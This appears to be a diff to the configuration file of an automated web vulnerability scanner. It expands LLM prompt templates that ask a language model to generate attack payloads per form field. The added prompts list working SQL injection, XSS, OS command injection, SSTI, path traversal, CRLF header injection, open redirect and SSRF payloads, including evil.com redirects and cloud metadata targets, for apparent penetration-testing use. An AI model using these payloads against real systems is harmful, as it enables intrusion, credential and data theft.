@@ -406,19 +406,167 @@ ssrf:
 # LLM prompt templates for context-aware payload generation
 llm_prompts:
   sqli: |
-    You are a web security expert. Generate SQL injection test payloads for a field named "{field_name}"
-    on endpoint "{url}". Consider the field context and generate 5 diverse payloads that test for:
-    1. Error-based SQLi
-    2. Boolean-based blind SQLi
-    3. Time-based blind SQLi
-    Output ONLY a JSON array of strings, nothing else. Example: ["payload1", "payload2"]
+    You are an expert web application penetration tester specializing in SQL injection.
+    Generate SQL injection payloads for a field named "{field_name}" at "{url}".
+
+    Field context: infer the field's role from its name.
+    - login/user/email/pass → prioritize auth bypass (OR 1=1, admin'--)
+    - id/num/page → integer injection (no quotes needed)
+    - search/q/query → UNION-based, error-based
+    - order/sort → ORDER BY injection
+
+    Generate exactly 10 diverse payloads covering ALL of these categories:
+    1. Syntax error probe: single quote, double quote, backtick
+    2. Auth bypass: OR '1'='1, admin'--
+    3. UNION column count detection: UNION SELECT NULL,NULL--
+    4. Boolean blind: AND 1=1 vs AND 1=2
+    5. Time-based blind: SLEEP(3), WAITFOR DELAY '0:0:3', pg_sleep(3)
+    6. Error-based MySQL: EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
+    7. Error-based MSSQL: CONVERT(int,@@version)
+    8. WAF bypass via comments: '/**/OR/**/1=1--, /*!UNION*//*!SELECT*/ NULL--
+    9. Stacked queries: '; SELECT 1--
+    10. OOB / second-order: ' INTO OUTFILE '/tmp/x'--
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+    Example: ["'", "' OR '1'='1'--", "1 UNION SELECT NULL--"]
 
   xss: |
-    You are a web security expert. Generate XSS test payloads for a field named "{field_name}"
-    on endpoint "{url}". Generate 5 diverse payloads that test reflected and stored XSS.
-    Consider filter bypasses. Output ONLY a JSON array of strings, nothing else.
+    You are an expert web application penetration tester specializing in XSS.
+    Generate XSS payloads for a field named "{field_name}" at "{url}".
+
+    Field context: infer the injection context from the field name.
+    - search/q/query → likely reflected into HTML body (use <script>, <img onerror=)
+    - name/title/comment → may be stored; use short robust payloads
+    - url/href/src → attribute context; use javascript: or data: URI
+    - style/css → CSS injection: expression(), -moz-binding
+
+    Generate exactly 10 diverse payloads covering:
+    1. Basic script tag: <script>alert(1)</script>
+    2. Event handler on img: <img src=x onerror=alert(1)>
+    3. SVG with onload: <svg onload=alert(1)>
+    4. Attribute injection: " onmouseover="alert(1)
+    5. JavaScript URI: javascript:alert(document.cookie)
+    6. HTML5 autofocus: <input autofocus onfocus=alert(1)>
+    7. Template literal / eval bypass: <script>eval(atob('YWxlcnQoMSk='))</script>
+    8. Filter bypass via encoding: <scr&#105;pt>alert(1)</scr&#105;pt>
+    9. Polyglot: "><svg/onload=alert(1)><!--
+    10. DOM sink via hash: #<img src=x onerror=alert(1)>
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+    Example: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
 
   os: |
-    You are a web security expert. Generate OS command injection test payloads for a field named
-    "{field_name}" on endpoint "{url}". Generate 5 payloads for both Unix and Windows systems.
-    Output ONLY a JSON array of strings, nothing else.
+    You are an expert web application penetration tester specializing in OS command injection.
+    Generate OS command injection payloads for a field named "{field_name}" at "{url}".
+
+    Field context: infer from field name.
+    - filename/file/path → path-based injection
+    - host/ip/server/ping → network command injection
+    - cmd/exec/command → direct command injection
+
+    Generate exactly 10 diverse payloads for BOTH Unix and Windows:
+    1. Unix chained: ; id
+    2. Unix pipe: | id
+    3. Unix background: & id
+    4. Unix AND: && id
+    5. Unix subshell: $(id)
+    6. Unix backtick: `id`
+    7. Windows chained: & whoami
+    8. Windows AND: && whoami
+    9. Blind time-based Unix: ; sleep 3
+    10. Blind time-based Windows: & ping -n 3 127.0.0.1
+
+    For each, also include a URL-encoded variant where the separator is encoded (%3B, %7C, %26).
+    Prioritize Unix payloads if the URL path looks like a Linux app.
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+    Example: ["; id", "| id", "& whoami"]
+
+  ssti: |
+    You are an expert penetration tester specializing in Server-Side Template Injection (SSTI).
+    Generate SSTI detection payloads for a field named "{field_name}" at "{url}".
+
+    Generate exactly 10 payloads targeting different template engines:
+    1. Jinja2/Twig math: {{7*7}}
+    2. Jinja2/Twig string: {{7*'7'}}
+    3. Jinja2 config dump: {{config}}
+    4. Mako: ${7*7}
+    5. ERB (Ruby): <%= 7*7 %>
+    6. SpEL (Spring): *{7*7}
+    7. OGNL (Struts): %{7*7}
+    8. Thymeleaf: [[${7*7}]]
+    9. Pebble/Velocity: #{7*7}
+    10. FreeMarker: ${7*7?c}
+
+    Expected output for math probes: 49. For string probe: 7777777.
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+
+  path_traversal: |
+    You are an expert penetration tester specializing in path traversal / LFI.
+    Generate path traversal payloads for a field named "{field_name}" at "{url}".
+
+    Generate exactly 10 diverse payloads:
+    1. Basic Unix: ../../../etc/passwd
+    2. Basic Windows: ..\..\..\windows\win.ini
+    3. URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd
+    4. Double encoded: ..%252F..%252Fetc%252Fpasswd
+    5. Null byte: ../../../etc/passwd%00
+    6. Absolute Unix: /etc/passwd
+    7. Absolute Windows: C:\windows\win.ini
+    8. Proc self: /proc/self/environ
+    9. Log poisoning target: /var/log/apache2/access.log
+    10. Deep traversal: ../../../../../../../../etc/passwd
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+
+  header_injection: |
+    You are an expert penetration tester specializing in HTTP header injection.
+    Generate header injection payloads for a field named "{field_name}" at "{url}".
+
+    Generate exactly 8 payloads using CRLF (\r\n) sequences:
+    1. Basic CRLF: value%0d%0aSet-Cookie:injected=1
+    2. Header split: value%0aX-Injected:true
+    3. Double CRLF (response split): value%0d%0a%0d%0a<html>injected</html>
+    4. URL encoded CR+LF: value%0D%0ALocation:http://evil.com
+    5. Unicode CR: value\u000dSet-Cookie:x=1
+    6. Location redirect: value%0d%0aLocation:http://example.com
+    7. XSS via header: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+    8. Cache poisoning: value%0d%0aX-Forwarded-Host:evil.com
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+
+  open_redirect: |
+    You are an expert penetration tester specializing in open redirect vulnerabilities.
+    Generate open redirect payloads for a field named "{field_name}" at "{url}".
+
+    Generate exactly 10 diverse payloads:
+    1. Basic absolute URL: https://evil.com
+    2. Protocol-relative: //evil.com
+    3. URL with path: https://evil.com/phishing
+    4. Encoded slash: https:/%2Fevil.com
+    5. Double encoded: https:%2F%2Fevil.com
+    6. Unicode slash: https://evil.com\@trusted.com
+    7. Backslash bypass: https:\\evil.com
+    8. Data URI: data:text/html,<script>alert(1)</script>
+    9. JavaScript URI: javascript:alert(document.cookie)
+    10. Newline bypass: %0ahttps://evil.com
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
+
+  ssrf: |
+    You are an expert penetration tester specializing in SSRF.
+    Generate SSRF payloads for a field named "{field_name}" at "{url}".
+
+    Generate exactly 10 diverse payloads targeting internal services:
+    1. AWS metadata: http://169.254.169.254/latest/meta-data/
+    2. GCP metadata: http://metadata.google.internal/computeMetadata/v1/
+    3. Azure IMDS: http://169.254.169.254/metadata/instance
+    4. Localhost HTTP: http://127.0.0.1/
+    5. Localhost alias: http://localhost/
+    6. File read: file:///etc/passwd
+    7. Internal port scan: http://127.0.0.1:8080/
+    8. IPv6 loopback: http://[::1]/
+    9. DNS rebinding bypass: http://localtest.me/
+    10. Decimal IP: http://2130706433/ (127.0.0.1 in decimal)
+
+    Output ONLY a valid JSON array of strings. No prose, no numbers, no markdown fences.
